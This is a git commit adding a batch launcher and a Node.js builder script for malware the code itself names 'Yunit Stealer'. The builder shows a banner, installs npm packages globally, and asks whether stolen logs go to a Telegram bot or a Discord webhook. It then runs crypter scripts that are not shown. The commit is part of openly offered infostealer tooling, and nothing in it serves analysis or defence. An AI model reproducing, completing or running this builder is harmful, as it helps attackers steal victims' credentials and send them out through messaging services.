0cb69efd6fc06ddcd3a9c49e309fec97c550a52f
Aura <108530916+freeman649@users.noreply.github.com>
2024-08-31 16:40:41 +0200

    Add files via upload

---
+++ build.bat
@@ -0,0 +1,5 @@
+@echo off
+set "CURRENT_DIR=%CD%"
+cd /d "%CURRENT_DIR%\build"
+call node build.js
+pause
---
+++ stub/builder.js
@@ -0,0 +1,52 @@
+const readlineSync = require('readline-sync');
+const { spawnSync } = require('child_process');
+const colors = require('colors');
+
+// Set console title
+process.stdout.write('\x1b]2;Yunit Stealer made by Aura\x07');
+
+// Install npm packages globally without waiting for input
+const npmInstallResult = spawnSync('npm', ['install', '-g', 'readline-sync', 'colors'], { stdio: 'inherit' });
+
+// Clear the console
+console.clear();
+
+// Display custom messages with color
+console.log('\n\n\n');
+console.log('             \x1b[34m$$\\     $$\\                    $$\\   $$\\     \x1b[0m');
+console.log('             \x1b[34m\\$$\\   $$  |                   \\__|  $$ |    \x1b[0m');
+console.log('             \x1b[34m \\$$\\ $$  /$$\\   $$\\ $$$$$$$\\  $$\\ $$$$$$\\   \x1b[0m');
+console.log('             \x1b[34m  \\$$$$  / $$ |  $$ |$$  __$$\\ $$ |\\_$$  _|  \x1b[0m');
+console.log('             \x1b[34m   \\$$  /  $$ |  $$ |$$ |  $$ |$$ |  $$ |    \x1b[0m');
+console.log('             \x1b[34m    $$ |   $$ |  $$ |$$ |  $$ |$$ |  $$ |$$\\ \x1b[0m');
+console.log('             \x1b[34m    $$ |   \\$$$$$$  |$$ |  $$ |$$ |  \\$$$$  | \x1b[0m');
+console.log('             \x1b[34m    \\__|    \\______/ \\__|  \\__|\\__|   \\____/  \x1b[0m');
+console.log('             \x1b[34m                                             \x1b[0m');
+console.log('             \x1b[34m                                             \x1b[0m');
+console.log('             \x1b[34m                                             \x1b[0m');
+console.log('    			        \x1b[34m Builder\x1b[0m');
+console.log('\n\n\n');
+
+// Ask the user to choose the logging method
+const logMethod = readlineSync.question('  '.white + '['.white + '?'.blue + ']'.white + ' Wanna receive log by (1: Telegram Bot, 2: Discord Webhook)>>> '.white,);
+
+if (logMethod === '1') {
+    // Run cryptertele.js for Telegram logging
+    const teleProcess = spawnSync('node', ['cryptertele.js'], { stdio: 'inherit' });
+    if (teleProcess.status === 0) {
+        console.log('');
+    } else {
+        console.error(`Error executing Telegram script. Exit code: ${teleProcess.status}`);
+    }
+} else if (logMethod === '2') {
+    // Run crypter.js for Discord Webhook logging
+    const discordProcess = spawnSync('node', ['crypter.js'], { stdio: 'inherit' });
+    if (discordProcess.status === 0) {
+        console.log('');
+    } else {
+        console.error(`Error executing Discord script. Exit code: ${discordProcess.status}`);
+    }
+} else {
+    console.log('Invalid choice. Exiting...');
+    setTimeout(() => process.exit(), 5000);
+}
